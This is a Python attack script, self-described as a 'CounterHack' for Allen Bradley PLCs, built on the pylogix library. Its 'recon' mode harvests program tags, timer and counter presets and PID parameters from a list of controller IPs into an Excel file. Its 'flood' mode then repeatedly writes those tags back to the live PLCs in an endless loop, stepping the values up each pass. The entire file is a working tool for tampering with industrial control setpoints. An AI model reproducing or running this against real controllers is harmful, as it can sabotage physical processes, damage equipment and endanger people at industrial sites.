# Welcome to the CounterHack for Allen Bradley PLC
# Enjoy the magic


import argparse
import pylogix
from pylogix import PLC
from struct import unpack_from
import pandas as pd
import time


def create_arguments():
    file_parser = argparse.ArgumentParser(description="Welcome to Allen Bradley PLC CounterHack!")

    manage_parser = file_parser.add_argument_group('Parameters to control scripts')
    manage_parser.add_argument('action', default='flood', choices=['flood', 'recon'],
                               help="Select working mode. flood - flood PLC with parameters (default), recon - gather tags from PLCs")

    export_modification_parser = file_parser.add_argument_group('Parameters')
    export_modification_parser.add_argument("-f", "--tags_file",
                                            help="Provide path to the xlsx file with tags and values")
    export_modification_parser.add_argument('-o', '--output', help="Provide output file path to create tags file.")
    export_modification_parser.add_argument('-p', '--port', default=44818, help="Specify port for communication. Default: 44818")
    export_modification_parser.add_argument("--ip_list", help="Provide PLC ip list. eg 10.0.0.1,10.0.0.2")
    export_modification_parser.add_argument('--emulator', action=argparse.BooleanOptionalAction, default=False, help="Use if you know if PLC is emulated. Default --non-emulator")

    tags_file = file_parser.parse_args().tags_file
    output_file = file_parser.parse_args().output
    ip = file_parser.parse_args().ip_list
    action = file_parser.parse_args().action
    emulator = file_parser.parse_args().emulator
    port = file_parser.parse_args().port
    return tags_file, output_file, ip, action, emulator, port


class HackControl:
    ip = []
    tags_file: str
    output_file: str
    emulator:bool
    port:int

    def __init__(self, ip, tags_file, output_file, emulator, port):
        self.get_ip_addresses_from_text(ip)
        self.tags_file = tags_file
        self.output_file = output_file
        self.emulator = emulator
        self.port = port

    def get_ip_addresses_from_text(self, ip):
        if ip:
            self.ip = ip.split(",")

    def recon(self):
        print("Started gathering tags. Please wait...")
        tags_record = InitialValuesPLCs(self.output_file, self.emulator,self.port, self.ip)
        tags_record.download_all_setups()
        tags_record.drop_unresponsive_ip()
        tags_record.add_empty_columns()
        print("Almost there! No kidding")
        tags_record.print_to_file()

    def flood(self):
        print("Time to pour some water!")
        delay = input("Please enter interval (sec):\n")
        try:
            flood = FloodPLC(self.tags_file, self.emulator, self.port)

            print("Flooding...")
            it = 1
            while True:
                if it % 1000 == 0:
                    print(f"You have poured a lot of water! Currently {it} iterations!")
                flood.inject()
                time.sleep(float(delay))
                it += 1
        except KeyboardInterrupt:
            print('Drying... See Ya!')


class PLCHandler:
    ip: str
    tags = []
    types = []
    values = []
    setup: pd.DataFrame
    comm: pylogix.eip.PLC
    emulator: bool
    port: int

    def __init__(self, ip, emulator, port):
        self.ip = ip
        self.port = port
        self.emulator = emulator
        self.open_connection()

    def open_connection(self):
        self.comm = PLC()
        self.comm.conn.Port = self.port
        self.comm.IPAddress = self.ip
        if self.emulator:
            self.comm.ProcessorSlot = 2

    def close_connection(self):
        self.comm.Close()

    def get_list_of_tags(self):
        imported_tags = self.comm.GetTagList()
        for tag in imported_tags.Value:
            if tag.TagName and tag.DataType and ("Program" in tag.TagName):
                self.tags.append(tag.TagName)
                self.types.append(tag.DataType)

    def get_tag_values(self):
        index_to_pop = []
        imported_tags = self.tags.copy()
        imported_types = self.types.copy()
        i = 1
        for it in range(len(imported_tags)):
            ret = self.comm.Read(imported_tags[it])
            if imported_types[it] == "COUNTER":
                counter = Counter(ret.Value)
                self.tags[it+i-1] = str(self.tags[it+i-1]) + ".PRE"
                self.values.append(counter.PRE)
            elif imported_types[it] == "TIMER":
                time = Timer(ret.Value)
                self.tags[it+i-1] = str(self.tags[it+i-1]) + ".PRE"
                self.values.append(time.PRE)
            elif imported_types[it] == "PID":
                pid = PID(ret.Value)
                pid_dict = vars(pid)

                index_to_pop.append(it + i)
                for key in pid_dict:
                    self.types.insert(it + i, "PID")
                    self.tags.insert(it + i, imported_tags[it] + "." + key)
                    self.values.append(pid_dict[key])
                    i += 1
            else:
                self.values.append(ret.Value)
        self.pop_pid_neutrals(index_to_pop)

    def pop_pid_neutrals(self, pop_list):
        for i in range(len(pop_list)):
            self.types.pop(pop_list[i] - i - 1)
            self.tags.pop(pop_list[i] - i - 1)

    def setup_pandas(self):
        self.setup = pd.DataFrame(list(zip(self.tags, self.types, self.values)),
                                  columns=['Tags', 'Tag Types', 'Values'])

    def map_start_values(self):
        try:
            self.open_connection()
            self.get_list_of_tags()
            self.get_tag_values()
            self.setup_pandas()
            self.close_connection()
        except TypeError:
            raise TimeoutError


class InitialValuesPLCs:
    df_list = []
    ip_list = []
    ip_to_drop = []
    ip_file_path: str
    output_file_path: str
    emulator: bool
    port: int

    def __init__(self, output_file_path, emulator, port, ip_list=[], ip_file_path=""):
        self.emulator = emulator
        self.port = port
        self.ip_list = ip_list
        self.ip_file_path = ip_file_path
        if not self.ip_list:
            self.get_ip_from_file()
        self.output_file_path = output_file_path

    def get_ip_from_file(self):
        file = open(self.ip_file_path, "r")
        ips = file.read().strip()
        self.ip_list = ips.split(",")

    def download_all_setups(self):
        for ip in self.ip_list:
            try:
                self.df_list.append(get_plc_response(ip, self.emulator, self.port))
            except TimeoutError:
                print(f'Device {ip} is not responding. Skipping...')
                self.ip_to_drop.append(ip)

    def drop_unresponsive_ip(self):
        for i in self.ip_to_drop:
            self.ip_list.remove(i)

    def print_to_file(self):
        if not self.ip_list:
            print(f"All devices are not responding. Tags have not been saved.")
        else:
            print(f"Tags have been saved in {self.output_file_path}")
            with pd.ExcelWriter(self.output_file_path) as writer:
                for i in range(len(self.ip_list)):
                    self.df_list[i].to_excel(writer, sheet_name=self.ip_list[i], index=False)

    def add_empty_columns(self):
        for i in range(len(self.ip_list)):
            self.df_list[i]["Step"] = ""
            self.df_list[i]["Start Value"] = ""

class FloodPLC:
    df_list = []
    ip_list = []
    file_path: str
    emulator: bool
    port: int

    def __init__(self, file_path, emulator, port):
        self.file_path = file_path
        self.port = port
        self.emulator = emulator
        self.get_ip_list_from_sheets()
        self.load_values()

    def get_ip_list_from_sheets(self):
        tabs = pd.ExcelFile(self.file_path)
        self.ip_list = tabs.sheet_names

    def load_values(self):
        for ip in self.ip_list:
            self.df_list.append(pd.read_excel(self.file_path, sheet_name=ip))

    def inject(self):
        i = 0
        for df in self.df_list:
            comm = PLC()
            comm.conn.Port = self.port
            comm.IPAddress = self.ip_list[i]
            if emulator:
                comm.ProcessorSlot = 2
            for index, row in df.iterrows():
                tag = row[0]
                value = self.handle_increases(df, row, index)
                comm.Write(tag, value)
            comm.Close()
            i += 1

    def handle_increases(self, df, row, index):
        if not row[3] == "nan":
            value = row[2]
        else:
            value = row[4]
            df.at[index, df.columns[4]] = row[4] + row[3]
        return value

class Timer(object):

    def __init__(self, data):
        self.PRE = unpack_from('<i', data, 4)[0]
        self.ACC = unpack_from('<i', data, 8)[0]
        bits = unpack_from('<i', data, 0)[0]
        self.EN = get_bit(bits, 31)
        self.TT = get_bit(bits, 30)
        self.DN = get_bit(bits, 29)


class Counter(object):
    def __init__(self, data):
        self.PRE = unpack_from('<i', data, 4)[0]
        self.ACC = unpack_from('<i', data, 8)[0]
        bits = unpack_from('<i', data, 0)[0]

        self.CU = get_bit(bits, 31)
        self.CD = get_bit(bits, 30)
        self.DN = get_bit(bits, 29)
        self.OV = get_bit(bits, 28)
        self.UN = get_bit(bits, 27)


class PID(object):
    def __init__(self, data):
        self.SP = unpack_from('<f', data, 4)[0]
        self.KP = unpack_from('<f', data, 8)[0]
        self.KI = unpack_from('<f', data, 12)[0]
        self.KD = unpack_from('<f', data, 16)[0]
        self.BIAS = unpack_from('<f', data, 20)[0]
        self.MAXS = unpack_from('<f', data, 24)[0]
        self.MINS = unpack_from('<f', data, 28)[0]
        self.DB = unpack_from('<f', data, 32)[0]
        self.SO = unpack_from('<f', data, 36)[0]
        self.MAXO = unpack_from('<f', data, 40)[0]
        self.MINO = unpack_from('<f', data, 44)[0]
        self.UPD = unpack_from('<f', data, 48)[0]

        bits = unpack_from('<i', data, 0)[0]
        self.EN = get_bit(bits, 31)
        self.CT = get_bit(bits, 30)
        self.CL = get_bit(bits, 29)
        self.PVT = get_bit(bits, 28)
        self.DOE = get_bit(bits, 27)
        self.SWM = get_bit(bits, 26)
        self.CA = get_bit(bits, 25)
        self.MO = get_bit(bits, 24)
        self.PE = get_bit(bits, 23)


def get_plc_response(ip, emulator, port):
    plc_handler = PLCHandler(ip, emulator, port)
    plc_handler.map_start_values()
    return plc_handler.setup


def get_bit(value, bit_number):
    mask = 1 << bit_number
    if (value & mask):
        return True
    else:
        return False


tags_file, output_file, ip, action, emulator, port = create_arguments()
port = int(port)
if action == "recon":
    if not ip:
        print("Specify ip. Use --ip_list")
    elif not output_file:
        print("Provide output file path. Format xlsx. Use -o")
    else:
        hack = HackControl(ip, tags_file, output_file, emulator, port)
        hack.recon()
if action == "flood":
    if not tags_file:
        print("Provide tag file path. Format xlsx. Use -f")
    else:
        hack = HackControl(ip, tags_file, output_file, emulator, port)
        hack.flood()
